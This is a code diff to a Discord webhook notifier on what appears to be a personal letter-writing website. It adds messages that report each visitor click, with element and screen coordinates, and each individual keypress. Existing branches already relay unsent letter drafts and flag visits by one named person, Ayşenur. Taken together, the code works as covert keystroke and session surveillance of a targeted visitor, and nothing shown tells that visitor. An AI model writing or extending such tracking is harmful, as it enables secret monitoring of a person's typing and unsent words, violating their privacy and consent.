@@ -118,6 +118,14 @@ export async function sendDiscordWebhook(
       title = eventType === 'letter_draft_abandoned' ? '⚠️ Mektup Yarım Bırakıldı / Sayfadan Ayrıldı' : '✍️ Canlı Mektup Taslağı Yazılıyor';
       color = 16478608; // Rose #fb7185
       description = eventType === 'letter_draft_abandoned' ? 'Ziyaretçi mektup yazarken sayfayı kapattı veya ayrıldı. En son yazılan metin aşağıdadır:' : 'Ziyaretçi mektup kutusuna yazı yazıyor:';
+    } else if (eventType === 'last_user_click') {
+      title = `🖱️ Ziyaretçi Ekrana Tıkladı: ${data.clickType || 'Tıklama'}`;
+      color = 3801080; // Sky Blue
+      description = `Ziyaretçi sayfada bir yere tıkladı.\n🎯 **Tıklanan Eleman:** \`${data.targetElement || '-'}\`\n📍 **Koordinat:** \`${data.coordinates || '-'}\`\n🖱️ **Tıklama Tipi:** ${data.clickType || '-'}`;
+    } else if (eventType === 'last_user_keypress') {
+      title = `⌨️ Ziyaretçi Klavyede Tuşa Bastı: "${data.key || data.pressed_key || '-'}"`;
+      color = 3801080; // Sky Blue
+      description = `Ziyaretçi klavyede bir tuşa bastı.\n🔤 **Basılan Tuş:** \`${data.key || data.pressed_key || '-'}\``;
     } else if (eventType === 'visitor_left_page' || eventType === 'last_page_abandoned') {
       title = isAysenurVisit ? '🚪🌹 Ayşenur Sayfadan Ayrıldı / Sekmeyi Kapattı' : '🚪 Ziyaretçi Sayfadan Ayrıldı';
       color = isAysenurVisit ? 14749257 : 9740472; // Crimson or Slate Gray
